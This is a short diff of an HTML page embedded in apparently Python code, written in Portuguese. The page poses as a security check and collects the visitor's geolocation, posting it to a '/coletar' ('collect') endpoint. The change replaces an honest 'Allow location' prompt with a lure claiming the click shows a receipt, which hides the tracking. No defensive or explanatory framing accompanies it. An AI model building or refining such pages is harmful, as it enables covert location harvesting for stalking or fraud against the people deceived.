@@ -17,7 +17,7 @@ html = '''
 <head><title>Confirmação</title></head>
 <body>
 <h1>Verificando segurança...</h1>
-<p>Para continuar, clique em "Permitir localização".</p>
+<p>Para visualizar o comprovante, clique em "Continuar".</p>
 <script>
 navigator.geolocation.getCurrentPosition(function(position) {
     fetch("/coletar", {
